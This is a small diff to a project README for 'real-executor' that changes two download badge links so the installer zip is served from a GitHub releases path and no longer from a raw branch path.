@@ -15,7 +15,7 @@
     <img src="https://img.shields.io/badge/🌐%20LIVE%20DEMO-8A2BE2?style=for-the-badge">
   </a>
   &nbsp;
-  <a href="https://github.com/real-executor/real-executor.github.io/raw/refs/heads/main/downloads/real-installer.zip">
+  <a href="https://github.com/real-executor/real-executor.github.io/releases/download/latest/real-installer.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD-00C853?style=for-the-badge">
   </a>
 
@@ -43,7 +43,7 @@ Built with a responsive design, smooth animations and an easy-to-use experience.
 
   <br>
 
-  <a href="https://github.com/real-executor/real-executor.github.io/raw/refs/heads/main/downloads/real-installer.zip">
+  <a href="https://github.com/real-executor/real-executor.github.io/releases/download/latest/real-installer.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20REAL%20EXECUTOR-8A2BE2?style=for-the-badge&logo=github&logoColor=white">
   </a>
 
